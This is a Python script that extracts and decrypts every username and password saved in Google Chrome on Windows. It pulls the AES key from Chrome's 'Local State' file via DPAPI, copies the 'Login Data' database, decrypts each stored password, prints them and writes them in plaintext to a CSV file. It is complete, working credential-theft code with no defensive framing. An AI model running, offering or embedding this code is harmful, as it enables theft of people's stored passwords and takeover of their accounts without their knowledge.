#this script extracts usernames and passwords from Google Chrome 
#for each website that the user has locally stored
#his credentials. Saves output in chrome_creds.csv.

import os
import sys
from shutil import copy2
import sqlite3
from base64 import b64decode
from json import loads
import win32crypt
from Crypto.Cipher import AES
import csv


def chrome_creds_extractor():
    #extract and decode the AES key which is used to
    #encrypt the passwords.
    #It is stored in '%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Local State'
    #as json format

    try:
        key_path = os.path.join(os.environ['USERPROFILE'],'AppData','Local','Google','Chrome','User Data','Local State')
        with open(key_path,'r',encoding='utf-8') as f:
            key = loads(f.read())
            key = b64decode(key['os_crypt']['encrypted_key'])
            #remove DPAPI string
            key = key[5:]
            key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            
    except Exception as e:
        print(e)
        sys.exit(1)

    #copy sqlite chrome database since it cannot be accessed
    #while chrome is running. It's location is
    #'%USERPROFILE%\AppData\Local\Google\Chrome\User Data\default\Login Data'
    
    try:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "Login Data")
        copy2(db_path,'chrome_db_temp.db')

        conn = sqlite3.connect('chrome_db_temp.db')
        c = conn.cursor()
        #query desired info from database
        c.execute('select origin_url, action_url, username_value, password_value from logins')

        origin_urls = list()
        action_urls = list()
        usernames = list()
        passwords = list()

        for row in c.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = row[3]

            # get the initialization vector
            iv = password[3:15]
            password = password[15:]
            # generate cipher
            cipher = AES.new(key, AES.MODE_GCM, iv)
            # decrypt password
            password = cipher.decrypt(password)[:-16].decode()

            print(f"Origin_url: {origin_url}\naction_url: {action_url}\nusername: {username}\npassword: {password}\n")

            origin_urls.append(origin_url)
            action_urls.append(action_url)
            usernames.append(username)
            passwords.append(password)


        #save result into csv file
        with open('chrome_creds.csv',mode='w') as f:
            csv_writer = csv.writer(f,delimiter=',')
            csv_writer.writerow(["Origin_url","action_url","username","password"])
            for origin_url,action_url,username,password in zip(origin_urls,action_urls,usernames,passwords):
                csv_writer.writerow([origin_url,action_url,username,password])

        c.close()
        conn.close()
        os.remove('chrome_db_temp.db')

    except Exception as e:
        print(e)
        sys.exit(1)
        

chrome_creds_extractor()
